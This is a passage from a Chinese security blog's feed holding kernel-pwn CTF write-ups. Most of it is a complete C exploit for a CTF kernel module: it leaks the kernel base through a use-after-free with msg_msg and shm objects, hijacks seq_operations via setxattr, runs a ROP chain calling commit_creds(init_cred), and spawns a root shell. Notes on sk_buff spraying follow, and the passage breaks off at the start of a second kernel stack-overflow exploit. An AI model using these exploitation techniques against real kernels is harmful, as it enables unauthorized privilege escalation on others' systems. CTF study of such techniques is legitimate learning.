class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">long</span></span><br><span class="line">setxattr(struct dentry *d, <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value,</span><br><span class="line">     <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用的方法就是类似这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setxattr(&quot;&#x2F;exp1&quot;, &quot;Photon&quot;, buf, 0x20, 0)</span><br></pre></td></tr></table></figure><p>倒数第二个参数是申请object的大小，buf是内容。</p><p>对于UAF来说，通过这个系统调用我们可以很方便的对某个free的object进行更改。但是之后这个object又会被放入free list,这会造成在offset偏移处写上某个指针(放入free list的object通过链表形式连在一起，类似用户态下的chunk，但是不一定是在头8个字节，似乎是根据object的大小而定的offset偏移处)。所以这个系统调用经常和<code>userfaultfd</code>一起使用,也就是俗称的<strong>堆占位</strong>技术。我还没有学习这个技术，不过听说userfaultfd在较新版本的内核当中变成了只有root才能使用的，所以可用性降低了许多。关于这个技术后面有时间学习一下写一篇blog整理一下。</p><p>用<code>setxattr</code>进行写的方法和题目给的写方法其实差不多。但是我实际测试的时候发现需要将之前释放的<code>shm_file</code>再申请上，不然后面执行system的时候会报<code>__kmalloc</code>的时候引用非法地址的错误</p><p>其exp和之前的大差不差，基本上就是把题目给的写操作换成了setxattr</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_SIZE 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BASE 0xffffffff81000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff82850580</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RSP_RET 0xffffffff8100d3d3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RSP_VAL_RET 0xffffffff8111347b</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff8106ab4d</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff81095c30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE    0xffffffff81e00ef4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RET 0xffffffff81e01058</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_CLOSE 0xffffffff8124b180</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRETQ 0xffffffff8102b4df</span></span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"><span class="keyword">int</span> dev_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Error</span><span class="params">(<span class="keyword">char</span>* error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m [?] %s\033[0m\n&quot;</span>,error);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Doing</span><span class="params">(<span class="keyword">char</span> * Doing)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m [*] %s \033[0m\n&quot;</span>,Doing);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Done</span><span class="params">(<span class="keyword">char</span> *Done)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] %s \033[0m\n&quot;</span>,Done);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">writeMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    m_type;</span><br><span class="line">    <span class="keyword">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span>-<span class="keyword">sizeof</span>(struct msg_msg)+SHM_SIZE-<span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;uafmsg;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int32_t</span> index;</span><br><span class="line">    <span class="keyword">int32_t</span> len;</span><br><span class="line">    <span class="keyword">void</span>* ptr;</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;request;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int32_t</span> index,<span class="keyword">int32_t</span> len,<span class="keyword">void</span> * ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    req.len = len;</span><br><span class="line">    req.ptr = ptr;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xDEADBEEF</span>, &amp;req);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int32_t</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xC0DECAFE</span>, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">open_shm_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> shmid;</span><br><span class="line"><span class="keyword">if</span> ((shmid=shmget(IPC_PRIVATE,<span class="number">100</span>,<span class="number">0600</span>))==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[?] Shmget Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *shmaddr=shmat(shmid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (shmaddr==(<span class="keyword">void</span>*)<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[?] Shmat Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shmaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">leak_addr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Doing(<span class="string">&quot;Start Leaking addr&quot;</span>);</span><br><span class="line">    <span class="keyword">void</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">void</span>* recv = <span class="built_in">malloc</span>(<span class="number">0x1018</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span>(qid&lt;<span class="number">0</span>)</span><br><span class="line">        Error(<span class="string">&quot;Make Queue Error&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;uafmsg,<span class="number">0</span>,<span class="keyword">sizeof</span>(uafmsg));</span><br><span class="line">    writeMsg(qid,&amp;uafmsg,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span>* shm_addr=open_shm_file();</span><br><span class="line">    <span class="keyword">if</span>(shmdt(shm_addr) &lt; <span class="number">0</span>) <span class="comment">//****注意要释放，否则会kernel panic</span></span><br><span class="line">        Error(<span class="string">&quot;shmdt!&quot;</span>);</span><br><span class="line">    readMsg(qid,recv,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    kernel_base = ((<span class="keyword">uint64_t</span>*)recv)[<span class="number">0x1fb</span>]- <span class="number">0x19ac6c0</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;%lx&quot;,((uint64_t*)recv)[0x1fb]);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] kernel_base_addr is %lx \033[0m\n&quot;</span>,kernel_base);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">    <span class="built_in">free</span>(recv);</span><br><span class="line">    Done(<span class="string">&quot;leaking Dne&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> kernel_base;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getR00t</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Fail to get root\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Success!!! root now\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdi_ret;</span><br><span class="line"><span class="keyword">uint64_t</span> init_cred;</span><br><span class="line"><span class="keyword">uint64_t</span> commit_creds;</span><br><span class="line"><span class="keyword">uint64_t</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(dev_fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Error(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> data[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> offset  = leak_addr()-BASE;</span><br><span class="line">    <span class="keyword">uint64_t</span>* buf = (<span class="keyword">uint64_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);<span class="comment">//需要申请回来</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">1</span>);</span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">1</span>);</span><br><span class="line">    buf[<span class="number">0</span>] = ADD_RSP_VAL_RET+offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;???---&gt;%d&quot;</span>,setxattr(<span class="string">&quot;/exp1&quot;</span>, <span class="string">&quot;Photon&quot;</span>, buf, <span class="number">0x20</span>, <span class="number">0</span>));<span class="comment">//写上了object，但是出错了？？？__kmalloc的时候r12和rax设置有问题</span></span><br><span class="line">    <span class="comment">//add(1,0x20,buf);</span></span><br><span class="line">    pop_rdi_ret = POP_RDI_RET+offset;</span><br><span class="line">    init_cred = INIT_CRED+offset;</span><br><span class="line">    commit_creds = COMMIT_CREDS+offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE+offset;</span><br><span class="line">    </span><br><span class="line">    Doing(<span class="string">&quot;Start Trigger&quot;</span>);</span><br><span class="line">    <span class="comment">//read(seq_fd,data,0x20);</span></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, pop_rdi_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, init_cred;&quot;</span> <span class="comment">// add rsp, 0x40 ; ret</span></span><br><span class="line">        <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, 0x9999999999999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x8888888888888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x7777777777777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9, 0x6666666666666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0x5555555555555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0x4444444444444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://s2.loli.net/2023/01/23/5y7XrNMJUi9guWH.png" alt=""></p><h3 id="利用sk-buff进行写"><a href="#利用sk-buff进行写" class="headerlink" title="利用sk_buff进行写"></a>利用sk_buff进行写</h3><p>sk_buff也同样可以提供任意大小对象的分配写入与释放，但是sk_buff本身不含任何用户数据，游湖数据被单独放在一个object中，然后由sk_buff中存放指向这个object的指针来管理。</p><p><img src="https://s2.loli.net/2023/01/27/r3atGL5O1MAXiT7.png" alt=""></p><p>sk_buff在内核协议栈中代表一个包，所以我们只需要创建一对socket，然后在上面发送接收数据包就可以实现sk_buff的分配与释放。比如我们可以用socketpair系统调用创建一对socket，然后进行read和write</p><p>对于本题如果想要劫持0x20的seq_operation的话这样做应该是行不通的，因为在内核中的用户data的object大小并不是我们指定的大小，而是还需要加上一个<code>SKB_SHARED_INFO_SIZE</code> ，这个部分称作分片结构，其大小为0x140。<code>skb_shared_info</code>分片结构和sk_buff的线性数据区内存分配及销毁时都是一起的。所以如果我们想要写SIZE大小的object，我们需要构造SIZE-0x140大小的buff数据才行。sk_buff行为如下图所示。headroom+data+tailroom部分为线性数据区，skb_shared_info为分片结构</p><p><img src="https://s2.loli.net/2023/01/27/wHfbFgM64qISkZv.png" alt=""></p><p>所以在本题中，如果我们想要用sk_buff进行改写operation，我们需要选择其他可以利用的结构体，满足条件至少为大小大于0x140。</p><p>这里可以采用的方法是利用泄露内核堆地址，然后劫持pipe_operation的函数表地址，在堆上伪造函数表进行ROP。这个方法和之后整理的D3CTF当中的D3HEAP方法类似，所以挪到那个地方讲，如果有空的话再在这题试一下</p><h1 id="D3CTF2022-D3heap"><a href="#D3CTF2022-D3heap" class="headerlink" title="[D3CTF2022]D3heap"></a>[D3CTF2022]D3heap</h1><p>等待施工…..</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/#Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址">【CTF.0x06】D^ 3CTF2022 d3kheap 出题手记 - arttnba3’s blog</a></p><p><a href="https://www.anquanke.com/post/id/253478#h2-2">CVE-2017-6074 DCCP拥塞控制协议Double-Free提权分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近研究了一下内核堆相关的知识点，主要以题解的形式夹杂着整理，也有一些杂七杂八的内容，在此做一下记录仅供参考。因为我也是刚入门pwn的初学者，所以可能记录会有点啰嗦，敬请谅解&lt;/p&gt;
&lt;h1 id=&quot;slub分配&quot;&gt;&lt;a href=&quot;#slub分配&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="kernel" scheme="http://phot0n.com/tags/kernel/"/>
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>CatCTF2022</title>
    <link href="http://phot0n.com/2023/01/02/CatCTF2022/"/>
    <id>http://phot0n.com/2023/01/02/CatCTF2022/</id>
    <published>2023-01-02T08:02:03.000Z</published>
    <updated>2023-02-15T13:40:26.780Z</updated>
    
    <content type="html"><![CDATA[<p>最近打的一场CTF，题目比较友好。有空了把剩下没做出来的pwn题复现一下，或者学一下reverse(又预见了🕊)</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="welcome-CAT-CTF"><a href="#welcome-CAT-CTF" class="headerlink" title="welcome_CAT_CTF"></a>welcome_CAT_CTF</h2><p>用IDA给patch一下client程序逻辑然后运行即可</p><h2 id="kernel-test"><a href="#kernel-test" class="headerlink" title="kernel-test"></a>kernel-test</h2><p>内核栈溢出，先read泄露canary然后write写ROP到pwn上最后ioctl调用即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span 